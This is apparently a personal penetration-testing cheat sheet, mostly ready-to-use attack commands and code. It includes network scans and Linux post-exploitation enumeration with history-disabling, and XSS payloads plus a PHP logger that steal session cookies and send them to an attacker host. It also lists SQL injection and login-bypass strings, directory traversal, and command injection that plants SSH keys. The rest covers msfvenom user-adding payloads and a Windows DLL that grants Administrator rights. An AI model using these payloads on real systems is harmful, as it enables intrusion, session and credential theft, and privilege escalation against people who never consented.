/////////////// SCANS \\\\\\\\\\\\\\\\\ 
nmap -Pn -sT <IP> -T4 -v
  --script discovery 				#all enumeration options, or use scripts below
    --script smb-os-discovery			#enumerate smb (can also append -p 445)
    --script http-title
    --script http-grep
    --script http-enum				#enumerate website (append -p 80)
    --script banner -p <port>
NOTE: w/ proxychains, specify port

proxychains nikto -host <IP> -or- nikto --host=http:/10.50.20.170	#same as http-enum 

getend services <port>				#resolve a ports service through nsswitch.conf

ssh user@ip -t /bin/bash < all24.sh 		#runs the NON-INTERACTIVE script remotely from target box (-t /bin/bash will try to force bash shell)

ssh user@<ip> cat /etc/passwd			#run a single command remotely (can | to filter output)

//Scan script for IPs
for i in {1..254}; do nc -nzvw1 192.168.1.$i 20-23 80 2>&1 & done | grep -E 'succ|open$|OK$'

//Scan script for Ports
for i in {20..22000} ; do nc -nvzw1 <IP> $i 2>&1 & done | grep -E 'OK$|succ|open$'

//Scan with /dev/tcp
for i in {20.22000} ; do if >/dev/tcp/<IP>/$i ; then echo Port $i & fi done

shift ~ c					#ssh escape sequence 

//Web Site Scraping
(in the url) /robots.txt			#tells you what my be there

wget -r <IP of website>				#creates dir with IP scraped as name

/**********************************************************************************************/
/////////////////// LINUX \\\\\\\\\\\\\\\\\\\\\\\

//Xfreerdp
xfreerdp /v:<IP> /u:<USER> /size:1920x1000 /clipboard +home-drive

ipcalc <IP w/cider>				#subnet calc
ss -or- netstat (-tulpn)			#view listen connections
ps aux | grep ssh				#view my backgrounded tunnels
watch -n0 "ss -nutlp"				#watch output in real-time
dpkg -l | grep pam				#get PAM version

//Post Exploitation(Actions on box)
cat /etc/hosts					#looking for next box to scan
cat /etc/passwd					#look for other users to su to
cat /etc/group | grep wheel 			#can sudo or switch users
sudo -l						#see what commands you can sudo
sudo -s						#may give root privs
crontab -l					#see jobs running under your user
/var/spool/cron 				#scheduled user jobs
objdump -s -j .rodata /bin/netstat_natpu  	#check out suspicious binary

find / -type f -perm /4000 2>/dev/null		#find files w/ suid / guid set
find /dev -type f				#find writeable files in /dev
find / -type d -writable			#find writeable dirs
find / -type f -exec file {} \; | grep PE	#looking for windows exe on linux

file *						#See if files are 'elf' or 'exe'
uname -a 
cat /etc/os-release
cd /etc/rsyslog.d				#cat .conf to see where/what is being logged
whoami || groups || id || who || w
ip neighbor || ip a || route || ip route || ip addr
unset HISTFILE					#turn off bash command input logging
set | grep HIST

echo “a bunch of text” | tr ‘ ‘ ‘\n’		#translate spaces to endlines for /etc/passwd

//Check CRONTAB
cat /etc/crontab				#look for something weird
cd /etc/cron.d					#look for something weird
find /etc/cron* -writable			#look for something weird (also try without -writeable)

//Check encoding on creds && decode
echo <passwd> | base64 -d
echo <passwd> | rot13

//Linux Exploitation
https://gtfobins.github.io/

/**********************************************************************************************/
///////////////////// XSS \\\\\\\\\\\\\\\\\\\\\\\\ 
1. Post to the blog && check from another browser that the post saved on the server
2. Test for XSS ( all text blocks )
    <script> alert('hell0') </script>
    <script> alert(/hell0/) </script>
		 
//Print out your own cookie
    <script> alert(document.cookie) </script>		#PHPSESSID=......(is the cookie)

3. Upload this to the blog
    <script> document.location="http://<IP>/cookie_stealer1.php?username="+document.cookie; </script>
4. Create a cookiefile.txt on the victim or on your own webserver
5. Upload the cookie_stealer.php file to a file upload function or host the file on your own web server
    <?php
    $cookie = $_GET["username"];
    $steal = fopen("/var/www/html/cookiefile.txt", "a+");
    fwrite($steal, $cookie . "\n");
    fclose($steal);
    ?>

//Or use a nc listener to catch the cookie (any computer can see our ops station floating ip address) 
    <script> document.location="http://10.50.24.132:8001? username="+document.cookie;</script>

/**********************************************************************************************/
////////////////// SQL INJECTION \\\\\\\\\\\\\\\\\\\\ 
//Identify Databases
    'union select 3,table_schema,4 from information_schema.tables union select 5,6,'7

//Identify Tables on a specific database
    'union select 3,table_name,4 from information_schema.tables where table_schema = '<database of interest>' union select 5,6,'7

//Identify Columns on a specific table
    'union select 3,column_name,4 from information_schema.columns where table_name = '<table of interest>' union select 5,6,'7

//Dump infomation from columns of interest
    'union select 3,concat(<columnname>, ":", <columnname>),4 from <tablename> union all select 5,6,'7

//LOGIN PAGE	!!!!!!!************************!!!!!
#ALWAYS try to dump username/password database like this
    login.php?username=bob' or 1='1 & passwd=bob'or 1='1

#view page source to see what the names of the variables are (password or passwd)

//Test SQL Susceptibility
---------------
url/pick.php?product=7 or 1=1			#Is it injectable? Blank screen means NO
url/pick.php? union select 1,2,3
url/pick.php?product=7 union select table_schema, table_name, column_name from information_schema.columns	
url/select username,user_id,name from siteusers.users
---------------
1. test for vulnerability / injection
    Ford' OR 1='1;#

2. use a union statement, see how many columns you need
    Ford' UNION SELECT 1,2;#		#or 1,2,3 -or- 1,2,3,4

3. enumerate database information schema		#table_schema is database name
    Ford' UNION SELECT null,table_schema,table_name, column_name FROM information_schema.columns;# 

4. get information from database linked to webserver specifically
    ^^ WHERE table_schema=database();#

5. enumerate specific information 
    Ford' UNION SELECT 1,2,name,password from database.users;#
NOTE: make sure to check for 0 indexed user ids

// Directory Traversal
url/image.php?file=../../etc/passwd
../../../../../../../../../../../../../../../../../etc/passwd
	/etc/group
	/etc/hosts
	/etc/resolv.conf
	/etc/nsswitch.conf

//Command Injection
system("ping -c 1 ".$_GET["ip"]);
; cat /etc/passwd
hey ; whoami
; && ||			#try these commands 

//Plant SSH Keys (via command injection)
1. ssh-keygen					#make id_rsa.pub on OPs box
2. <a true statment> ; mkdir /var/www/.ssh	#make .ssh director and authorized keys file (on target box)
3. <a true statment> ; echo '<id_rsa.pub key>' > ~/.ssh/id_rsa.pub 
4. ssh to that box

// Malicious File Upload
1. upload pony.php to site
2. nav via url to where the file is saved on the site (i.e /uploads/)

//Log into SQL DB
shell> mysql --user=webuser --password=sqlpass
grep -r localhost OR grep -i pass *		#CREDS IN DATABASE
#Once on box look for a .php file with “//Set up DB connection”
    →mysqli_connect(‘localhost:3306’,’username’,’password’,’database’)

//SQL Commands
----------------
show databases;
show tables;
use <database>;
@@version
---------------

/**********************************************************************************************/
///////////// BUFFER OVERFLOW (Custom Payloads) \\\\\\\\\\\\\ 
1. Show payloads
msfvenom -l payloads | grep x86 | grep linux

2. Show options of exploit
msfvenom -p  linux/x86/adduser --list-options

3. Create the custom payload creating a new user
msfvenom -p  linux/x86/adduser SHELL=/bin/bash -f bash
-or-
msfvenom -p  linux/x86/adduser SHELL=/bin/bash -f bash -b'\x00\x0a\x0d\x20'	#take out bad chars

4. copy and paste output into build-exploit-linux-traditional.sh

//Create custom payload using the exec payload (replaces step 3)
msfvenom -p linux/x86/exec CMD='usermod -aG sudo user3' -f bash -b '\x00\x0a\x0d\x20'

/**********************************************************************************************/
////////////////////////// WINDOWS \\\\\\\\\\\\\\\\\\\\\\\   
//Windows Enumeration
tasklist /v
tasklist /svc
ipconfig /all
doskey /history
check for vulnserver (port 9999)

//REGISTRY KEY for usernames/passwords
hklm/software/microsoft/windows nt/currentversion/winlogon

1. Find the tasks / services being run 
    schtasks /query /fo LIST /v | select-string -pattern "Task to Run" -Context 0,6 |  more
      -or- 
    wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"

2. Enumerate permissions on directories / executables
    icacls <filename || directory || \users\<username> >

3. Search for dlls in the source code 
    findstr dll <source code>

4. Create dll
-------------------------
#include <windows.h>
int execCommand()
{
 WinExec("net localgroup Administrators <user> /add", 1);
 //WinExec("net localgroup Administrators "Remote Desktop Users" /add", 1);	#optional
 return 0;
}
BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
 execCommand();
 return 0;
}
------------------------

5. Compile dll (change example && source to dll name)
    i686-w64-mingw32-g++ -c -D example.dll source.c && i686-w64-mingw32-g++ -shared -o example.dll source.o -Wl,--out-implib,example.a

6. Download on target
python -m SimpleHTTPServer <RHP>
-or-
base64 file | xclip -selection clipboard

7. Decode file
certutil -decode file.txt file.exe

8. Reboot machine
shutdown -r
